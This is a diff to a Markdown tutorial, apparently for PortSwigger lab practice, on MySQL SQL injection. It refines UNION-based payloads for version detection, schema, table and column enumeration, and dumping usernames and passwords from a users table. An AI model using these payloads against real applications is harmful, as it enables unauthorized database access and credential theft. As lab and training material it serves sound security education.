@@ -8,7 +8,7 @@ It is widely used in web applications because it is fast, reliable, and easy to 
 
 Many real-world applications and PortSwigger Web Security Academy labs use MySQL as the backend database.
 
-Unlike Oracle or PostgreSQL, MySQL has its own SQL syntax, system tables, and built-in functions. Therefore, SQL Injection payloads used for MySQL are different from those used for other databases.
+Unlike Oracle or PostgreSQL, MySQL has its own SQL syntax, system databases, and built-in functions. Therefore, SQL Injection payloads used for MySQL are different from those used for other databases.
 
 ---
 
@@ -175,7 +175,7 @@ If the application displays a MySQL version string, the backend database is MySQ
 Example Output
 
 ```
-8.0.39
+8.0.39 MySQL Community Server - GPL
 ```
 
 ---
@@ -194,6 +194,8 @@ Example Output
 ' UNION SELECT NULL,database()--
 ```
 
+Knowing the current database helps you enumerate only the relevant tables.
+
 ---
 
 # Step 9 - Enumerate Tables
@@ -208,7 +210,8 @@ Example:
 
 ```sql
 ' UNION SELECT NULL,table_name
-FROM information_schema.tables--
+FROM information_schema.tables
+WHERE table_schema=database()--
 ```
 
 ---
@@ -226,7 +229,8 @@ Example:
 ```sql
 ' UNION SELECT NULL,column_name
 FROM information_schema.columns
-WHERE table_name='users'--
+WHERE table_name='users'
+AND table_schema=database()--
 ```
 
 ---
@@ -235,8 +239,6 @@ WHERE table_name='users'--
 
 After identifying the required table and columns:
 
-Example:
-
 ```sql
 ' UNION SELECT username,password
 FROM users--
@@ -244,10 +246,10 @@ FROM users--
 
 ---
 
-# MySQL System Tables
+# MySQL System Databases and Metadata
 
-| Table | Purpose |
-|-------|---------|
+| Database / Table | Purpose |
+|------------------|---------|
 | information_schema.tables | List all tables |
 | information_schema.columns | List all columns |
 | information_schema.schemata | List all databases |
